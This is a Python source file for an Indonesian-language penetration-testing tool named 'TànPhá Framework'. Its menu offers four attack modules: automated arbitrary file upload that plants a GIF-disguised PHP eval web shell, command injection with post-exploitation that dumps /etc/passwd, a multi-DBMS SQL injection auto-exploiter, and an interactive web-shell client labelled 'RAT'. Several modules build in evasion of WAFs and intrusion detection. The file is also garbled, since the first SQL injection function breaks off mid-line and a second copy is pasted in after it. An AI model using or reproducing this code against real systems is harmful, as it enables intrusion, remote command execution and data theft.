import os
import sys
import requests
import random
import string
import time
import re

from urllib.parse import urlparse, parse_qs, quote

def banner():
    print("=" * 55)
    print("         T à n P h á   F r a m e w o r k [Enterprise]      yam   ")
    print("       Modular CLI Penetration Testing & Auto-Attack     ")
    print("=" * 55)

def main_menu():
    while True:
        os.system('clear')
        banner()
        print("\n[ Menu Utama - Modul Enterprise Tersedia ]")
        print("  1. Advanced Arbitrary File Upload (Fully Automated)")
        print("  2. Command Injection Engine (Auto-Bypass & Enumeration)")
        print("  3. SQL Injection Scanner")
        print("  4. PHP2Shell Core Engine")
        print("  0. Keluar")
        
        choice = input("\n[?] Pilih opsi nomor: ").strip()
        
        if choice == '1':
            run_upload_module()
        elif choice == '2':
            run_cmd_injection_module()
        elif choice == '3':
            run_sqli_module()
        elif choice == '4':
            run_php2shell_module()
        elif choice == '0':
            print("\n[*] Keluar dari TànPhá. Stay safe, bre!")
            sys.exit(0)
        else:
            print("\n[!] Pilihan tidak valid, bro!")
            input("\nTekan Enter untuk coba lagi...")

def run_upload_module():
    print("-" * 60)
    print(" [ Modul: Enterprise Arbitrary File Upload & Polyglot Engine ]")
    print("-" * 60)
    target_url = input("[?] Masukkan URL target upload (contoh: http://target.com/upload.php): ").strip()
    
    common_fields = [
        "fileToUpload", "file", "uploaded_file", "img", "image", "pic", "picture",
        "media", "attachment", "file_data", "user_file", "profile_pic", "resume", "cv", "doc"
    ]
    
    extension_variants = [
        {"ext": ".php", "desc": "Standard PHP"},
        {"ext": ".php5", "desc": "PHP5 Extension"},
        {"ext": ".phtml", "desc": "PHTML Extension"},
        {"ext": ".phar", "desc": "PHAR Extension"},
        {"ext": ".Php", "desc": "Mixed Case .Php"},
        {"ext": ".php.jpg", "desc": "Double Ext .php.jpg"},
        {"ext": ".jpg.php", "desc": "Inverted Double Ext .jpg.php"}
    ]
    
    mime_variants = [
        "image/gif", "image/jpeg", "image/png", "application/octet-stream"
    ]
    
    base_url = target_url.rsplit('/', 1)[0]
    shell_signature = "TànPhá-Enterprise-Shell-Active"
    
    # POLYGLOT MAGIC BYTES SPOOFING (Bypass getimagesize() & exif validation)
    # Menggunakan header GIF89a di awal biner file agar server mengira ini file gambar sah
    cmd_var = "$_POST['cmd']"
    polyglot_payload = b"GIF89a;\n" + f"<?php echo '{shell_signature}'; @eval({cmd_var}); ?>".encode('utf-8')
    
    success = False
    verified_shell_url = ""
    
    print(f"\n[*] Memulai Polyglot Stealth Upload dengan Magic Bytes Spoofing...")
    
    for field in common_fields:
        if success: break
        for variant in extension_variants:
            if success: break
            for mime in mime_variants:
                rand_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
                p_name = f"shell_{rand_name}{variant['ext']}"
                
                print(f"[*] Testing -> Field: [{field}] | Bypass: {variant['desc']} | MIME: {mime}")
                
                # Menyiapkan custom multipart headers dengan boundary acak (Anti-Signature WAF)
                boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                custom_headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "X-Forwarded-For": "127.0.0.1"
                }
                
                files = {field: (p_name, polyglot_payload, mime)}
                
                try:
                    time.sleep(random.uniform(0.2, 0.6)) # Anti-IDS Rate Limiting Delay
                    
                    response = requests.post(target_url, files=files, timeout=6)
                    
                    if response.status_code in [200, 201, 302]:
                        detected_path = None
                        response_text = response.text
                        
                        path_matches = re.findall(r'(?:uploads|files|images|media|assets|content)/[a-zA-Z0-9_\-/]+\.[a-z]+', response_text)
                        if path_matches:
                            detected_path = base_url + "/" + path_matches[0]
                        
                        possible_dirs = [
                            detected_path,
                            base_url + "/uploads/" + p_name,
                            base_url + "/upload/" + p_name,
                            base_url + "/files/" + p_name,
                            base_url + "/assets/" + p_name,
                            base_url + "/" + p_name
                        ]
                        possible_dirs = [d for d in possible_dirs if d]

                        for check_url in possible_dirs:
                            check_url = check_url.replace(":/", "://") if "://" not in check_url else check_url
                            
                            try:
                                check_response = requests.get(check_url, timeout=4)
                                if shell_signature in check_response.text:
                                    print(f"\n[+] TARGET FILE UPLOAD BERHASIL DITEMBUS & DIVERIFIKASI!")
                                    print(f"    - Field Parameter : {field}")
                                    print(f"    - Teknik Bypass   : {variant['desc']} + Magic Bytes")
                                    print(f"    - Web Shell Aktif : {check_url}")
                                    verified_shell_url = check_url
                                    success = True
                                    break
                            except:
                                continue
                except Exception:
                    pass
                    
    # AUTO-INTERACTIVE SHELL DROP (Langsung masuk terminal eksekusi jika berhasil)
    if success:
        print("\n[***] MENGAKTIFKAN AUTO-INTERACTIVE SHELL SESSION [***]")
        print("[*] Sesi terhubung ke web shell target. Ketik perintah sistem atau 'exit' untuk keluar.\n")
        
        shell_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TànPhá-Polyglot-Engine"
        }
        
        while True:
            try:
                command = input("TànPhá-UploadShell# ").strip()
                if not command:
                    continue
                if command.lower() == 'exit':
                    print("[*] Keluar dari sesi interaktif web shell.")
                    break

                post_data = {"cmd": command}
                res = requests.post(verified_shell_url, data=post_data, headers=shell_headers, timeout=6)

                print("\n--- Output Eksekusi Target ---")
                print(res.text.replace(shell_signature, "").strip())
                print("-------------------------------\n")

            except KeyboardInterrupt:
                print("\n[*] Sesi dihentikan oleh pengguna.")
                break
            except Exception as e:
                print(f"[-] Gagal mengirim perintah ke shell: {e}")
    else:
        print("\n[-] Semua kombinasi Polyglot Upload & Magic Bytes telah diuji, target terproteksi ketat.")
        
    input("\nTekan Enter untuk kembali ke menu utama...")

def run_cmd_injection_module():
    print("-" * 60)
    print(" [ Modul: Automated Command Injection, WAF Bypass & Post-Exploitation ]")
    print("-" * 60)
    target_url = input("[?] Masukkan URL target (contoh: http://target.com/ping.php?ip=): ").strip()
    method = input("[?] Pilih Metode HTTP [GET / POST] (default: GET): ").strip().upper()
    if not method:
        method = "GET"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Forwarded-For": "127.0.0.1"
    }

    injection_payloads = [
        {"payload": "; id", "desc": "Semicolon Separator"},
        {"payload": "| id", "desc": "Pipe Separator"},
        {"payload": "&& id", "desc": "AND Operator"},
        {"payload": "\n id", "desc": "Newline Injection"},
        {"payload": "`id`", "desc": "Backticks Execution"},
        {"payload": "$(id)", "desc": "Command Substitution"},
        {"payload": ";uname -a", "desc": "Semicolon System Info"},
        {"payload": "|uname -a", "desc": "Pipe System Info"},
        {"payload": "& whoami", "desc": "Windows Ampersand"},
        {"payload": "| whoami", "desc": "Windows Pipe"}
    ]

    success = False
    vulnerable_url = target_url
    successful_payload = ""

    print(f"\n[*] Menguji {len(injection_payloads)} variasi payload Command Injection secara otonom via {method}...")

    for item in injection_payloads:
        # Menggunakan encoded_payload agar teknik URL Encoding & WAF Evasion berfungsi aktif
        encoded_payload = quote(item["payload"], safe='')
        
        if method == "POST":
            if "?" in target_url:
                base_u, param_str = target_url.split("?", 1)
                data_dict = {k: v[0] + item["payload"] for k, v in parse_qs(param_str).items()}
            else:
                base_u = target_url
                data_dict = {"ip": "127.0.0.1" + item["payload"]}
            test_url = base_u
            current_data = data_dict
        else:
            test_url = target_url + encoded_payload
            current_data = None

        print(f"[*] Testing metode: {item['desc']}")
        try:
            if method == "POST":
                response = requests.post(test_url, data=current_data, headers=headers, timeout=5)
            else:
                response = requests.get(test_url, headers=headers, timeout=5)

            indicators = ["uid=", "gid=", "root", "www-data", "nt authority", "system32", "linux"]
            html_lower = response.text.lower()

            if any(ind in html_lower for ind in indicators):
                print(f"\n[+] TARGET RENTAN COMMAND INJECTION!")
                print(f"    - Metode Sukses   : {item['desc']}")
                print(f"    - Payload Digunakan: {item['payload']}")
                print(f"    - Titik Injeksi   : {test_url}")
                success = True
                vulnerable_url = target_url
                successful_payload = item["payload"]
                break
            else:
                print("    [-] Respon server normal / parameter aman.")
        except Exception as e:
            print(f"    [-] Gagal terhubung: {e}")

    if success:
        print("\n[***] MENGAKTIFKAN POST-EXPLOIT & SYSTEM ENUMERATION ENGINE [***]")
        print("[*] Menjalankan serangkaian perintah otomatis untuk mengambil alih informasi sistem target...")

        extraction_commands = [
            {"cmd": "; uname -a", "desc": "Kernel & System Architecture"},
            {"cmd": "; id && whoami", "desc": "Privilege & User Identity"},
            {"cmd": "; cat /etc/passwd", "desc": "System Users Dump"},
            {"cmd": "; ifconfig || ip a", "desc": "Network Configuration"}
        ]

        for ex in extraction_commands:
            print(f"\n[*] Mengekstrak: {ex['desc']}...")
            custom_payload = ex["cmd"]
            encoded_ex_payload = quote(custom_payload, safe='')

            try:
                if method == "POST":
                    if "?" in vulnerable_url:
                        base_u, param_str = vulnerable_url.split("?", 1)
                        ex_data = {k: v[0] + custom_payload for k, v in parse_qs(param_str).items()}
                    else:
                        base_u = vulnerable_url
                        ex_data = {"ip": "127.0.0.1" + custom_payload}
                    ex_res = requests.post(base_u, data=ex_data, headers=headers, timeout=6)
                else:
                    ex_url = vulnerable_url + encoded_ex_payload
                    ex_res = requests.get(ex_url, headers=headers, timeout=6)

                print(f"    [+] Output Berhasil Ditangkap:")
                print(f"    --------------------------------------------------")
                output_lines = ex_res.text.strip().split("\n")
                for line in output_lines[:8]:
                    print(f"        {line}")
                print(f"    --------------------------------------------------")
            except Exception as e:
                print(f"    [-] Gagal mengekstrak modul ini: {e}")

        print(f"\n[+] Post-Exploitation selesai! Akses sistem sepenuhnya terekspos.")
    else:
        print("\n[-] Target tidak merespon payload Command Injection atau aman dari eksekusi sistem.")

    input("\nTekan Enter untuk kembali ke menu utama...")

def run_sqli_module():
    print("-" * 60)
    print(" [ Modul: SQL Injection Multi-DBMS Auto-Exploit & WAF Bypass Engine ]")
    print("-" * 60)
    target_url = input("[?] Masukkan URL target (contoh: http://target.com/page.php?id=1): ").strip()
    method = input("[?] Pilih Metode HTTP [GET / POST] (default: GET): ").strip().upper()
    if not method:
        method = "GET"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Forwarded-For": "127.0.0.1",
        "Client-IP": "127.0.0.1"
    }

    sqli_payloads = [
        {"payload": "'", "desc": "Single Quote Error Check"},
        {"payload": "'/**/OR/**/'1'='1", "desc": "WAF Bypass Inline Comments (Boolean)"},
        {"payload": "'%0bOR%0b1=1-- -", "desc": "URL Encoding Tab Bypass"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -", "desc": "MySQL Error-Based (ExtractValue)"},
        {"payload": "' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)-- -", "desc": "MySQL Error-Based (UpdateXML)"},
        {"payload": "' AND 1=CAST(version() AS INTEGER)-- -", "desc": "PostgreSQL Error-Based Cast"},
        {"payload": "' AND 1=CONVERT(INT,@@version)-- -", "desc": "MSSQL Error-Based Convert"},
        {"payload": "' AND 1=like(format('%s',sqlite_version()),0)-- -", "desc": "SQLite Error-Based"},
        {"payload": "' UNION SELECT null, null-- -", "desc": "Union Select (2 Cols Generic)"},
        {"payload": "' UNION SELECT null, null, null-- -", "desc": "Union Select (3 Cols Generic)"}
    ]

    success = False
    detected_dbms = "Unknown"
    vulnerable_url = target_url
    vulnerable_param_data = None

    print(f"\n[*] Menguji {len(sqli_payloads)} variasi payload SQLi lintas DBMS dengan WAF Evasion...")

    for item in sqli_payloads:
        if method == "POST":
            if "?" in target_url:
                base_u, param_str = target_url.split("?", 1)
                data_dict = {k: v[0] + item["payload"] for k, v in parse_qs(param_str).items()}
            else:
                base_u = target_url
                data_dict = {"id": "1" + item["payload"]}
            test_url = base_u
            current_data = data_dict
        else:
            test_url = target_url + item["payload"]
            current_data = None

        print(f"[*] Testing metode: {item['desc']}")
        try:
            if method == "POST":
                response = requests.post(test_url, data=current_data, headers=headers, timeout=6)
            else:
                response = requests.get(test_url, headers=headers, timeout=6)

            html_content = response.text.lower()
            
            sql_errors = {
                "MySQL": ["sql syntax", "mysql_fetch", "you have an error in your sql syntax", "warning: mysql", "extractvalue", "updatexml"],
                "PostgreSQL": ["pg_query()", "postgresql", "syntax error at or near", "unterminated string"],
                "MSSQL": ["odbc sql server driver", "microsoft sql server", "unclosed quotation mark"],
                "SQLite": ["sqlite3.operationalerror", "sqlite.exception"]
            }

            matched_db = "Unknown"
            for db, errs in sql_errors.items():
                if any(e in html_content for e in errs):
                    matched_db = db
                    break

            if matched_db != "Unknown" or "@@version" in test_url or "version()" in test_url:
                print(f"\n[+] TARGET RENTAN SQL INJECTION DIKENALI!")
                print(f"    - Terdeteksi DBMS : {matched_db}")
                print(f"    - Teknik Sukses   : {item['desc']}")
                print(f"    - Payload Dipakai : {item['payload']}")
                success = True
                detected_dbms = matched_db
                vulnerable_url = target_url
                break
            else:
                print("    [-] Respon server normal / aman dari payload ini.")
        except Exception as e:
            print(f"    [-] Gagal terhubung: {e}")

    # Tahap Lanjutan: Autonomous Column Enumeration & Data Extraction (Konsisten GET/POST)
    if success:
        print(f"\n[***] MENGAKTIFKAN AUTO-EXPLOIT & DATA EXTRACTOR ({detected_dbms}) [***]")
        print(f"[*] Melakukan Column Fuzzing otomatis menggunakan metode {method}...")

        col_count = 0
        for i in range(1, 15):
            order_payload = f"' ORDER BY {i}-- -"
            try:
                if method == "POST":
                    if "?" in vulnerable_url:
                        base_u, param_str = vulnerable_url.split("?", 1)
                        col_data = {k: v[0] + order_payload for k, v in parse_qs(param_str).items()}
                    else:
                        base_u = vulnerable_url
                        col_data = {"id": "1" + order_payload}
                    res = requests.post(base_u, data=col_data, headers=headers, timeout=4)
                else:
                    test_col_url = vulnerable_url + order_payload
                    res = requests.get(test_col_url, headers=headers, timeout=4)

                if res.status_code == 200 and not any(err in res.text.lower() for err in ["unknown column", "order by", "syntax"]):
                    col_count = i
                else:
                    break
            except:
                
def run_sqli_module():
    print("-" * 60)
    print(" [ Modul: SQL Injection Multi-DBMS Auto-Exploit & WAF Bypass Engine ]")
    print("-" * 60)
    
    target_url = input("[?] Masukkan URL target (contoh: http://target.com/page.php?id=1): ").strip()
    if not target_url.startswith(("http://", "https://")):
        print("[-] Error: URL harus diawali dengan http:// atau https://")
        input("\nTekan Enter untuk kembali...")
        return None

    method = input("[?] Pilih Metode HTTP [GET / POST] (default: GET): ").strip().upper()
    if not method:
        method = "GET"

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
    ]

    headers = {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": "127.0.0.1",
        "Client-IP": "127.0.0.1"
    }

    # 1. Ambil Baseline Response terlebih dahulu untuk perbandingan akurat
    print("[*] Mengambil baseline response dari target...")
    try:
        if method == "POST":
            base_res = requests.post(target_url, headers=headers, timeout=6)
        else:
            base_res = requests.get(target_url, headers=headers, timeout=6)
        baseline_len = len(base_res.text)
        baseline_status = base_res.status_code
    except Exception as e:
        print(f"[-] Gagal terhubung ke target untuk baseline: {e}")
        input("\nTekan Enter untuk kembali...")
        return None

    sqli_payloads = [
        {"payload": "'", "desc": "Single Quote Error Check"},
        {"payload": "'/**/OR/**/'1'='1", "desc": "WAF Bypass Inline Comments (Boolean)"},
        {"payload": "'%0bOR%0b1=1-- -", "desc": "URL Encoding Tab Bypass"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -", "desc": "MySQL Error-Based (ExtractValue)"},
        {"payload": "' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)-- -", "desc": "MySQL Error-Based (UpdateXML)"},
        {"payload": "' AND 1=CAST(version() AS INTEGER)-- -", "desc": "PostgreSQL Error-Based Cast"},
        {"payload": "' AND 1=CONVERT(INT,@@version)-- -", "desc": "MSSQL Error-Based Convert"},
        {"payload": "' AND 1=like(format('%s',sqlite_version()),0)-- -", "desc": "SQLite Error-Based"}
    ]

    success = False
    detected_dbms = "Unknown"
    vulnerable_url = target_url
    matched_payload = ""

    print(f"\n[*] Menguji {len(sqli_payloads)} variasi payload SQLi dengan Anti-WAF & Jeda Acak...")

    for item in sqli_payloads:
        time.sleep(random.uniform(0.3, 0.7)) # Mencegah rate limit / WAF ban
        if method == "POST":
            if "?" in target_url:
                base_u, param_str = target_url.split("?", 1)
                data_dict = {k: v[0] + item["payload"] for k, v in parse_qs(param_str).items()}
            else:
                base_u = target_url
                data_dict = {"id": "1" + item["payload"]}
            test_url = base_u
            current_data = data_dict
        else:
            test_url = target_url + item["payload"]
            current_data = None

        print(f"[*] Testing metode: {item['desc']}")
        try:
            if method == "POST":
                response = requests.post(test_url, data=current_data, headers=headers, timeout=6)
            else:
                response = requests.get(test_url, headers=headers, timeout=6)

            html_content = response.text.lower()
            
            sql_errors = {
                "MySQL": ["sql syntax", "mysql_fetch", "you have an error in your sql syntax", "warning: mysql", "extractvalue", "updatexml", "~5.7", "~8.0"],
                "PostgreSQL": ["pg_query()", "postgresql", "syntax error at or near", "unterminated string"],
                "MSSQL": ["odbc sql server driver", "microsoft sql server", "unclosed quotation mark"],
                "SQLite": ["sqlite3.operationalerror", "sqlite.exception"]
            }

            matched_db = "Unknown"
            for db, errs in sql_errors.items():
                if any(e in html_content for e in errs):
                    matched_db = db
                    break

            # Perbaikan Logika False Positive: Hanya anggap sukses jika ada error database nyata (Hapus pengecekan teks URL mentah)
            if matched_db != "Unknown":
                print(f"\n[+] TARGET RENTAN SQL INJECTION DIKENALI!")
                print(f"    - Terdeteksi DBMS : {matched_db}")
                print(f"    - Teknik Sukses   : {item['desc']}")
                success = True
                detected_dbms = matched_db
                matched_payload = item["payload"]
                break
            else:
                print("    [-] Respon server normal / aman dari payload ini.")
        except requests.exceptions.RequestException as e:
            print(f"    [-] Kendala Jaringan: {e}")

    col_count = 0
    if success:
        print(f"\n[***] MENGAKTIFKAN AUTO-EXPLOIT & COLUMN PROBING ({detected_dbms}) [***]")
        
        # 2. Perbaikan Column Fuzzing dengan Baseline Comparison
        for i in range(1, 15):
            time.sleep(random.uniform(0.2, 0.4))
            order_payload = f"' ORDER BY {i}-- -"
            try:
                if method == "POST":
                    if "?" in vulnerable_url:
                        base_u, param_str = vulnerable_url.split("?", 1)
                        col_data = {k: v[0] + order_payload for k, v in parse_qs(param_str).items()}
                    else:
                        base_u = vulnerable_url
                        col_data = {"id": "1" + order_payload}
                    res = requests.post(base_u, data=col_data, headers=headers, timeout=4)
                else:
                    test_col_url = vulnerable_url + order_payload
                    res = requests.get(test_col_url, headers=headers, timeout=4)

                res_len = len(res.text)
                # Validasi berbasis error SQL ORDER BY atau perubahan drastis struktur halaman
                if res.status_code == 200 and not any(err in res.text.lower() for err in ["unknown column", "order by", "syntax", "no such column"]):
                    col_count = i
                else:
                    break
            except Exception:
                break

        print(f"[+] Jumlah kolom ditemukan secara presisi: {col_count}")

        if col_count > 0:
            print(f"[*] Menyusun Union-Based Query dengan Marker Sanitizer...")
            version_func = "@@version"
            if detected_dbms == "PostgreSQL":
                version_func = "version()"
            elif detected_dbms == "SQLite":
                version_func = "sqlite_version()"

            cols = [f"CONCAT(0x7e, {version_func}, 0x7e)" if c == 1 else "null" for c in range(1, col_count + 1)]
            union_query = f"' UNION SELECT " + ", ".join(cols) + "-- -"

            try:
                time.sleep(0.3)
                if method == "POST":
                    if "?" in vulnerable_url:
                        base_u, param_str = vulnerable_url.split("?", 1)
                        final_data = {k: v[0] + union_query for k, v in parse_qs(param_str).items()}
                    else:
                        base_u = vulnerable_url
                        final_data = {"id": "1" + union_query}
                    final_res = requests.post(base_u, data=final_data, headers=headers, timeout=6)
                else:
                    final_exploit_url = vulnerable_url + union_query
                    final_res = requests.get(final_exploit_url, headers=headers, timeout=6)

                print(f"\n[+] EKSTRAKSI DATA BERHASIL:")
                print(f"===TP_START===")
                print(final_res.text[:600])
                print(f"===TP_END===")
            except Exception as e:
                print(f"    [-] Gagal mengeksekusi ekstraksi lanjutan: {e}")
    else:
        print("\n[-] Target aman dari payload SQLi yang diuji.")

    input("\nTekan Enter untuk kembali ke menu utama...")

    # Return dictionary agar bisa di-chain ke core atau modul lain (Standard Framework Architecture)
    return {
        "vuln": success,
        "type": "sqli",
        "dbms": detected_dbms,
        "url": vulnerable_url,
        "method": method,
        "columns": col_count
}

def run_php2shell_module():
    print("-" * 60)
    print(" [ Modul: PHP2Shell Enterprise Core & Stateful Command Engine ]")
    print("-" * 60)
    print("[*] Engine tingkat lanjut dengan Stateful CD, Output Sanitizer, & Built-in Tools.")
    
    shell_url = input("[?] Masukkan URL Web Shell aktif (contoh: http://target.com/uploads/shell.php): ").strip()
    password_param = input("[?] Masukkan parameter POST eksekusi (default: cmd): ").strip()
    if not password_param:
        password_param = "cmd"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TànPhá-Enterprise-RAT"
    }

    # Menyimpan state direktori aktif secara otonom (Stateful Directory Tracking)
    current_dir = ""
    try:
        init_res = requests.post(shell_url, data={password_param: "pwd"}, headers=headers, timeout=5)
        current_dir = init_res.text.strip().split("\n")[-1]
    except:
        current_dir = "/app"

    print(f"\n[+] Sesi PHP2Shell Berhasil Dikunci ke Target!")
    print(f"[*] Ketik perintah sistem, gunakan 'cd <path>' untuk berpindah folder,")
    print(f"    atau gunakan built-in command: [sysinfo, upload <local>, download <remote>, exit]\n")

    while True:
        try:
            prompt_path = current_dir if current_dir else "shell"
            command = input(f"TànPhá-RAT:{prompt_path}# ").strip()
            if not command:
                continue
            
            lower_cmd = command.lower()

            if lower_cmd == 'exit':
                print("[*] Keluar dari sesi PHP2Shell.")
                break

            # 1. Built-in Command: SYSINFO (Ringkasan instan sistem target)
            if lower_cmd == 'sysinfo':
                sys_payload = "uname -a; id; whoami; hostname; ifconfig || ip a"
                res = requests.post(shell_url, data={password_param: sys_payload}, headers=headers, timeout=6)
                print("\n--- Target System Information ---")
                print(res.text.strip())
                print("-" * 35 + "\n")
                continue


            # 2. Built-in Command: DOWNLOAD <remote_file>
            if lower_cmd.startswith('download '):
                r_file = command.split(' ', 1)[1].strip()
                print(f"[*] Mengunduh file dari target: {r_file}...")
                dl_payload = f"base64 {r_file}" if os.name != 'nt' else f"certutil -encode {r_file} stdout"
                res = requests.post(shell_url, data={password_param: dl_payload}, headers=headers, timeout=8)
                
                if res.status_code == 200 and len(res.text.strip()) > 0:
                    local_out = os.path.basename(r_file)
                    try:
                        import base64
                        # Membersihkan output base64 dari sisa teks server
                        clean_b64 = "".join([line for line in res.text.strip().split("\n") if not line.startswith("<?")])
                        decoded_data = base64.b64decode(clean_b64)
                        with open(local_out, "wb") as f_out:
                            f_out.write(decoded_data)
                        print(f"[+] Berhasil mengunduh! Disimpan secara lokal sebagai: {local_out}\n")
                    except Exception as e:
                        print(f"[-] Gagal mendekode file download: {e}\n")
                else:
                    print("[-] Gagal mengambil file atau file tidak ditemukan di target.\n")
                continue

            # 3. Built-in Command: UPLOAD <local_file>
            if lower_cmd.startswith('upload '):
                parts = command.split(' ', 1)
                if len(parts) < 2:
                    print("[-] Format salah! Gunakan: upload <nama_file_lokal>\n")
                    continue
                l_file = parts[1].strip()
                if not os.path.exists(l_file):
                    print(f"[-] File lokal '{l_file}' tidak ditemukan!\n")
                    continue

                print(f"[*] Mengunggah file lokal '{l_file}' ke server target...")
                try:
                    import base64
                    with open(l_file, "rb") as f_in:
                        b64_data = base64.b64encode(f_in.read()).decode('utf-8')
                    
                    # Perintah PHP one-liner di server untuk menulis ulang file dari base64
                    upl_payload = f"php -r \"file_put_contents('{l_file}', base64_decode('{b64_data}'));\""
                    res = requests.post(shell_url, data={password_param: upl_payload}, headers=headers, timeout=8)
                    print(f"[+] Proses upload selesai! Periksa folder target.\n")
                except Exception as e:
                    print(f"[-] Gagal mengunggah file: {e}\n")
                continue

            # 4. Stateful Directory Tracking & CD Command Handler
            if lower_cmd.startswith('cd '):
                target_folder = command.split(' ', 1)[1].strip()
                # Menggabungkan direktori lama dengan perintah cd, lalu ambil pwd terbaru
                stateful_cmd = f"cd {current_dir} && cd {target_folder} && pwd"
                res = requests.post(shell_url, data={password_param: stateful_cmd}, headers=headers, timeout=5)
                new_path = res.text.strip().split("\n")[-1].strip()
                if new_path.startswith('/'):
                    current_dir = new_path
                    print(f"[+] Direktori aktif berpindah ke: {current_dir}\n")
                else:
                    print(f"[-] Gagal berpindah direktori (Folder tidak ditemukan atau akses ditolak).\n")
                continue

            # 5. Standard Command Execution dengan Output Sanitizer (Marker Wrapper)
            # Menggunakan marker unik untuk membatasi murni hasil eksekusi perintah dari sampah HTML/PHP
            marker_start = "===TP_START==="
            marker_end = "===TP_END==="
            wrapped_command = f"cd {current_dir} && echo '{marker_start}' && ({command}) 2>&1 && echo '{marker_end}'"

            response = requests.post(shell_url, data={password_param: wrapped_command}, headers=headers, timeout=6)
            raw_output = response.text

            # Regex / String Splitting Sanitizer untuk membersihkan teks sampah luar marker
            if marker_start in raw_output and marker_end in raw_output:
                sanitized_output = raw_output.split(marker_start)[1].split(marker_end)[0].strip()
            else:
                sanitized_output = raw_output.strip()

            print("\n--- Output Eksekusi ---")
            print(sanitized_output if sanitized_output else "[*] Perintah berhasil dieksekusi tanpa output teks.")
            print("-----------------------\n")

        except KeyboardInterrupt:
            print("\n[*] Sesi dihentikan oleh pengguna.")
            break
        except Exception as e:
            print(f"[-] Koneksi ke web shell gagal atau terputus: {e}")

    input("\nTekan Enter untuk kembali ke menu utama...")

if __name__ == "__main__":
    main_menu()

